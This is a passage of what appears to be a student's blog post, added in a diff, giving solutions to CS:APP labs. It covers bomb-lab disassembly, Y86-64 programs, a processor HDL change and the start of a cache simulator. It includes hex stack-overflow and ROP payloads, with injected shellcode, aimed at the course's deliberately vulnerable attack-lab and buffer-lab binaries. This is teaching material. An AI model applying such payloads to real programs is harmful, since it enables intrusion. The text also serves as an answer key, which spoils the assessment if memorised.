+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (ebp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; ebp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; ebp&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;) {
+    rax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rbx.next;
+    eax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rax.value;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (rbx.value &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; eax) explode_bomb();
+    rbx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rbx.next;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;node3 &amp;gt; node4 &amp;gt; node5 &amp;gt; node6 &amp;gt; node1 &amp;gt; node2&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Good work!  On to the next...
+4 3 2 1 6 5
+Congratulations! You&#39;ve defused the bomb!
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;secret-phase&#34;&gt;Secret Phase&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x004010f4]&amp;gt; s sym.secret_phase
+[0x00401242]&amp;gt; pdf
+            ; CALL XREF from sym.phase_defused @ 0x401630(x)
+┌ 81: sym.secret_phase ();
+│           0x00401242      53             push rbx
+│           0x00401243      e856020000     call sym.read_line
+│           0x00401248      ba0a000000     mov edx, 0xa                ; int base
+│           0x0040124d      be00000000     mov esi, 0                  ; char * *endptr
+│           0x00401252      4889c7         mov rdi, rax                ; const char *str
+│           0x00401255      e876f9ffff     call sym.imp.strtol         ; long strtol(const char *str, char * *endptr, int base)
+│           0x0040125a      4889c3         mov rbx, rax
+│           0x0040125d      8d40ff         lea eax, [rax - 1]
+│           0x00401260      3de8030000     cmp eax, 0x3e8              ; 1000
+│       ┌─&amp;lt; 0x00401265      7605           jbe 0x40126c
+│       │   0x00401267      e8ce010000     call sym.explode_bomb
+│       │   ; CODE XREF from sym.secret_phase @ 0x401265(x)
+│       └─&amp;gt; 0x0040126c      89de           mov esi, ebx                ; int64_t arg2
+│           0x0040126e      bff0306000     mov edi, obj.n1             ; 0x6030f0 ; &amp;quot;$&amp;quot; ; int64_t arg1
+│           0x00401273      e88cffffff     call sym.fun7
+│           0x00401278      83f802         cmp eax, 2                  ; 2
+│       ┌─&amp;lt; 0x0040127b      7405           je 0x401282
+│       │   0x0040127d      e8b8010000     call sym.explode_bomb
+│       │   ; CODE XREF from sym.secret_phase @ 0x40127b(x)
+│       └─&amp;gt; 0x00401282      bf38244000     mov edi, str.Wow__Youve_defused_the_secret_stage_ ; 0x402438 ; &amp;quot;Wow! You&#39;ve defused the secret stage!&amp;quot; ; const char *s
+│           0x00401287      e884f8ffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x0040128c      e833030000     call sym.phase_defused
+│           0x00401291      5b             pop rbx
+└           0x00401292      c3             ret
+
+[0x00401242]&amp;gt; s sym.fun7
+[0x00401204]&amp;gt; pdf
+            ; CALL XREFS from sym.fun7 @ 0x401217(x), 0x40122d(x)
+            ; CALL XREF from sym.secret_phase @ 0x401273(x)
+┌ 62: sym.fun7 (int64_t arg1, signed int64_t arg2);
+│           ; arg int64_t arg1 @ rdi
+│           ; arg signed int64_t arg2 @ rsi
+│           0x00401204      4883ec08       sub rsp, 8
+│           0x00401208      4885ff         test rdi, rdi               ; arg1
+│       ┌─&amp;lt; 0x0040120b      742b           je 0x401238
+│       │   0x0040120d      8b17           mov edx, dword [rdi]        ; arg1
+│       │   0x0040120f      39f2           cmp edx, esi                ; arg2
+│      ┌──&amp;lt; 0x00401211      7e0d           jle 0x401220
+│      ││   0x00401213      488b7f08       mov rdi, qword [rdi + 8]    ; int64_t arg1
+│      ││   0x00401217      e8e8ffffff     call sym.fun7
+│      ││   0x0040121c      01c0           add eax, eax
+│     ┌───&amp;lt; 0x0040121e      eb1d           jmp 0x40123d
+│     │││   ; CODE XREF from sym.fun7 @ 0x401211(x)
+│     │└──&amp;gt; 0x00401220      b800000000     mov eax, 0
+│     │ │   0x00401225      39f2           cmp edx, esi                ; arg2
+│     │┌──&amp;lt; 0x00401227      7414           je 0x40123d
+│     │││   0x00401229      488b7f10       mov rdi, qword [rdi + 0x10] ; int64_t arg1
+│     │││   0x0040122d      e8d2ffffff     call sym.fun7
+│     │││   0x00401232      8d440001       lea eax, [rax + rax + 1]
+│    ┌────&amp;lt; 0x00401236      eb05           jmp 0x40123d
+│    ││││   ; CODE XREF from sym.fun7 @ 0x40120b(x)
+│    │││└─&amp;gt; 0x00401238      b8ffffffff     mov eax, 0xffffffff         ; -1
+│    │││    ; CODE XREFS from sym.fun7 @ 0x40121e(x), 0x401227(x), 0x401236(x)
+│    └└└──&amp;gt; 0x0040123d      4883c408       add rsp, 8
+└           0x00401241      c3             ret
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Readline and convert to number.&lt;/p&gt;
+&lt;p&gt;The number should smaller than 1001, and the result of &lt;code&gt;fun7()&lt;/code&gt; should be 2.&lt;/p&gt;
+&lt;p&gt;Arg1 is a root of a tree.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;n1
+    dq 24h
+    dq offset n21
+    dq offset n22
+    dq 0
+
+n21
+    dq 8
+    dq offset n31
+    dq offset n32
+    dq 0
+
+n22
+    dq 32h
+    dq offset n33
+    dq offset n34
+    dq 0
+
+n32
+    dq 16h
+    dq offset n43
+    dq offset n44
+    dq 0
+
+n33
+    dq 2Dh
+    dq offset n45
+    dq offset n46
+    dq 0
+
+n31
+    dq 6
+    dq offset n41
+    dq offset n42
+    dq 0
+
+n34
+    dq 6Bh
+    dq offset n47
+    dq offset n48
+    dq 0
+
+n45
+    dq 28h
+    dq 0
+    dq 0
+    dq 0
+
+n41
+    dq 1
+    dq 0
+    dq 0
+    dq 0
+
+n47
+    dq 63h
+    dq 0
+    dq 0
+    dq 0
+
+n44
+    dq 23h
+    dq 0
+    dq 0
+    dq 0
+
+n42
+    dq 7
+    dq 0
+    dq 0
+    dq 0
+
+n43
+    dq 14h
+    dq 0
+    dq 0
+    dq 0
+
+n46
+    dq 2Fh
+    dq 0
+    dq 0
+    dq 0
+
+n48
+    dq 3E9h
+    dq 0
+    dq 0
+    dq 0
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The tree:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;
+                      0x24
+          v------------|------------v
+          8                        0x32
+    v-----|------v            v-----|------v
+    6           0x16         0x2d         0x6b
+v---|---v    v---|---v    v---|---v    v---|---v
+1       7   0x14    0x23 0x28    0x2f 0x63   0x3e9
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In fun7:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;rdi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; root;
+rsi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input_num;
+edx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; root.value;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (edx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; rsi) {
+    rdi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdi.lchild;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fun7&lt;/span&gt;(rdi, rsi);
+}
+eax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (edx &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; esi) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; eax;
+}
+&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+    rdi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdi.rchild;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; fun7(rdi, rsi);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The target is 2, so we need:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ret 0
+ret 1 + 2 * 0
+ret 2 * (1 + 2 * 0)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Therefore, the input should be 22.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Welcome to my fiendish little bomb. You have 6 phases with
+which to blow yourself up. Have a nice day!
+Border relations with Canada have never been better.
+Phase 1 defused. How about the next one?
+1 2 4 8 16 32
+That&#39;s number 2.  Keep going!
+7 327
+Halfway there!
+0 0 DrEvil
+So you got that one.  Try this one.
+ionefg
+Good work!  On to the next...
+4 3 2 1 6 5
+Curses, you&#39;ve found the secret phase!
+But finding it and solving it are quite different...
+22
+Wow! You&#39;ve defused the secret stage!
+Congratulations! You&#39;ve defused the bomb!
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;lab3-attack-lab&#34;&gt;Lab3 Attack-lab&lt;/h2&gt;
+&lt;p&gt;直接使用 ROP 打了&lt;/p&gt;
+&lt;h3 id=&#34;phase-1-1&#34;&gt;Phase 1&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;61 61 61 61 61 61 61 61
+61 61 61 61 61 61 61 61
+61 61 61 61 61 61 61 61
+61 61 61 61 61 61 61 61
+62 62 62 62 62 62 62 62
+C0 17 40 00 00 00 00 00
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-2-1&#34;&gt;Phase 2&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61
+62 62 62 62 62 62 62 62
+1b 14 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+EC 17 40 00 00 00 00 00
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-3-1&#34;&gt;Phase 3&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;35 39 62 39 39 37 66 61 
+00 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61
+62 62 62 62 62 62 62 62
+1b 14 40 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+FA 18 40 00 00 00 00 00
+&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
+&lt;p&gt;Phase 4 和 5 不知道为什么打不通，跳过了&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;lab4-buffer-lab&#34;&gt;Lab4 Buffer-lab&lt;/h2&gt;
+&lt;p&gt;感觉像另一个版本的 Attack lab&lt;/p&gt;
+&lt;h3 id=&#34;phase-0&#34;&gt;Phase 0&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+62 62 62 62
+18 8C 04 08
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-1-2&#34;&gt;Phase 1&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+62 62 62 62
+42 8C 04 08
+63 63 63 63
+8e 3e aa 69
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-2-2&#34;&gt;Phase 2&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;movl $0x69aa3e8e, 0x0804D100
+push $0x08048C9D
+ret
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;c7 05 00 d1 04 08 8e
+3e aa 69
+68 9d 8c 04 08
+c3
+
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+62 62 62 62
+28 3d 68 55
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-3-2&#34;&gt;Phase 3&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov $0x69aa3e8e, %eax
+mov $0x55555555, %ebp
+push $0x08048DBE
+ret
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;b8 8e 3e aa 69
+bd 80 3d 68 55
+68 be 8d 04 08
+c3
+
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+62 62 62 62
+28 3d 68 55
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-4-1&#34;&gt;Phase 4&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov $0x69aa3e8e, %eax
+mov %esp, %ebp
+add $0x28, %ebp
+push $0x08048DBE
+ret
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;b8 8e 3e aa 69
+89 e5
+83 c5 28
+68 be 8d 04 08
+c3
+
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61
+
+62 62 62 62
+48 3b 68 55
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;lab5-arch-lab&#34;&gt;Lab5 Arch-lab&lt;/h2&gt;
+&lt;h3 id=&#34;part-a&#34;&gt;Part A&lt;/h3&gt;
+&lt;p&gt;第一部分是使用 Y64 语言写几个程序&lt;/p&gt;
+&lt;p&gt;写的不规范，能跑就行&lt;/p&gt;
+&lt;p&gt;sum.ys&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-y64&#34; data-lang=&#34;y64&#34;&gt;    .pos 0
+init:
+    irmovq Stack, %rsp
+    call Main
+    halt
+
+Main:
+    irmovq ele1, %rdi
+    call Sum
+    ret
+
+Sum:
+    xorq %rax, %rax
+    rrmovq %rdi, %rcx
+  loop:
+    andq %rcx, %rcx
+    je end
+    mrmovq 0(%rcx), %rbx
+    addq %rbx, %rax
+    mrmovq 8(%rcx), %rcx
+    jmp loop
+  end:
+    ret
+
+# Sample linked list
+.align 8
+ele1:
+.quad 0x00a
+.quad ele2
+ele2:
+.quad 0x0b0
+.quad ele3
+ele3:
+.quad 0xc00
+.quad 0
+
+    .pos 0x200
+Stack:
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;rsum.ys&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-y64&#34; data-lang=&#34;y64&#34;&gt;    .pos 0
+init:
+    irmovq Stack, %rsp
+    call Main
+    halt
+
+Main:
+    irmovq ele1, %rdi
+    xorq %rax, %rax
+    call rsum_list
+    ret
+
+rsum_list:
+  loop:
+    andq %rdi, %rdi
+    je end
+    mrmovq 0(%rdi), %rbx
+    pushq %rbx
+    mrmovq 8(%rdi), %rdi
+    call rsum_list
+    popq %rbx
+    addq %rbx, %rax
+    jmp loop
+  end:
+    ret
+
+# Sample linked list
+.align 8
+ele1:
+.quad 0x00a
+.quad ele2
+ele2:
+.quad 0x0b0
+.quad ele3
+ele3:
+.quad 0xc00
+.quad 0
+
+    .pos 0x200
+Stack:
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;copy.ys&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-y64&#34; data-lang=&#34;y64&#34;&gt;    .pos 0
+init:
+    irmovq Stack, %rsp
+    call Main
+    halt
+
+Main:
+    irmovq src, %rdi
+    irmovq dest, %rsi
+    irmovq $3, %rdx
+    call copy
+    ret
+
+copy:
+    irmovq $1, %r8
+    irmovq $8, %r9
+    xorq %rax, %rax
+    rrmovq %rdx, %rcx
+  loop:
+    mrmovq 0(%rdi), %rbx
+    rmmovq %rbx, 0(%rsi)
+    xorq %rbx, %rax
+    addq %r9, %rdi
+    addq %r9, %rsi
+    subq %r8, %rcx
+    andq %rcx, %rcx
+    jne loop
+    ret
+
+# Sample linked list
+.align 8
+# Source block
+src:
+.quad 0x00a
+.quad 0x0b0
+.quad 0xc00
+# Destination block
+dest:
+.quad 0x111
+.quad 0x222
+.quad 0x333
+
+    .pos 0x200
+Stack:
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;part-b&#34;&gt;Part B&lt;/h3&gt;
+&lt;p&gt;这部分不太会，全靠注释和网上资料做的&lt;/p&gt;
+&lt;p&gt;参考书上的相似指令，自己画了个整体架构&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#############################################
+#     Stage    # iaddq V, rB                #
+#############################################
+#              # icode: ifun &amp;lt;- M_1[PC]     #
+# Fetch Stage  # rA: rB      &amp;lt;- M_1[PC + 1] #
+#              # valC        &amp;lt;- M_8[PC + 2] #
+#              # valP        &amp;lt;- PC + 10     #
+#############################################
+# Decode Stage # valB &amp;lt;- R[rB]              #
+#############################################
+# Excuse Stage # valE &amp;lt;- valC + valB        #
+#############################################
+#   Writeback  #                            #
+#     Stage    # R[rB] &amp;lt;- valE              #
+#############################################
+#   Update PC  # PC &amp;lt;- valP                 #
+#############################################
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Fetch 阶段&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Determine instruction code
+word icode = [
+	imem_error: INOP;
+	1: imem_icode;		# Default: get from instruction memory
+];
+
+# Determine instruction function
+word ifun = [
+	imem_error: FNONE;
+	1: imem_ifun;		# Default: get from instruction memory
+];
+
+bool instr_valid = icode in 
+	{ INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,
+	       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ };
+
+# Does fetched instruction require a regid byte?
+bool need_regids =
+	icode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, 
+		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ};
+
+# Does fetched instruction require a constant word?
+bool need_valC =
+	icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ };
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Decode 阶段&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;## What register should be used as the A source?
+word srcA = [
+	icode in { IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  } : rA;
+	icode in { IPOPQ, IRET } : RRSP;
+	1 : RNONE; # Don&#39;t need register
+];
+
+## What register should be used as the B source?
+word srcB = [
+	icode in { IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  } : rB;
+	icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
+	1 : RNONE;  # Don&#39;t need register
+];
+
+## What register should be used as the E destination?
+word dstE = [
+	icode in { IRRMOVQ } &amp;amp;&amp;amp; Cnd : rB;
+	icode in { IIRMOVQ, IOPQ, IIADDQ} : rB;
+	icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
+	1 : RNONE;  # Don&#39;t write any register
+];
+
+## What register should be used as the M destination?
+word dstM = [
+	icode in { IMRMOVQ, IPOPQ } : rA;
+	1 : RNONE;  # Don&#39;t write any register
+];
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Execute 阶段&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;## Select input A to ALU
+word aluA = [
+	icode in { IRRMOVQ, IOPQ } : valA;
+	icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ } : valC;
+	icode in { ICALL, IPUSHQ } : -8;
+	icode in { IRET, IPOPQ } : 8;
+	# Other instructions don&#39;t need ALU
+];
+
+## Select input B to ALU
+word aluB = [
+	icode in { IRMMOVQ, IMRMOVQ, IOPQ, ICALL, 
+		      IPUSHQ, IRET, IPOPQ, IIADDQ } : valB;
+	icode in { IRRMOVQ, IIRMOVQ } : 0;
+	# Other instructions don&#39;t need ALU
+];
+
+## Set the ALU function
+word alufun = [
+	icode == IOPQ : ifun;
+	1 : ALUADD;
+];
+
+## Should the condition codes be updated?
+bool set_cc = icode in { IOPQ, IIADDQ };
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PC 更新阶段不需要更改&lt;/p&gt;
+&lt;h2 id=&#34;lab7-cache-lab&#34;&gt;Lab7 Cache-lab&lt;/h2&gt;
+&lt;p&gt;需要实现一个 LRU 的 Cache 系统&lt;/p&gt;
+&lt;p&gt;不知道该怎么实现，直接逆 &lt;code&gt;csim-ref&lt;/code&gt; 加抄网上资料了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;getopt.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;cachelab.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, E &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, v &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;tracefile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; S &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, B &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; hit_count, miss_count, eviction_count;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; lru_counter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, set_index_mask;
+
+
+FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; valid_bit;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; tag;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; lru;
+} cache_line_t, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;cache_set_t, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;cache_t;
+
+cache_t cache;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
+
+} Node;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;printUsage&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;name){
